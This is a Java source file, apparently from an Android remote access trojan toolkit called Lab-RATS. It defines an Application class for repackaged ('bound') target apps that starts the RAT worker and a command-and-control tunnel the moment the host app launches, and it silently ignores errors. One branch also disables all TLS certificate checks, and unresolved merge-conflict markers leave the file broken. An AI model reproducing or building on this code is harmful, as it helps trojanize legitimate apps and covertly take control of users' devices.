package com.labs.labrats;

import android.app.Application;
import android.content.Context;

/**
 * Fallback Application class for bound target APKs.
 * Ensures Lab-RATS services and C2 tunnel launch immediately when the app process starts.
 */
public class LabRatsApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
<<<<<<< HEAD
        SslUtils.trustAllCertificates();
=======
>>>>>>> origin/K4N3CO.v1.6
        LabRatsWorker.init(this);
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        try {
<<<<<<< HEAD
            SslUtils.trustAllCertificates();
=======
>>>>>>> origin/K4N3CO.v1.6
            LabRatsWorker.init(base);
        } catch (Throwable ignored) {}
    }
}
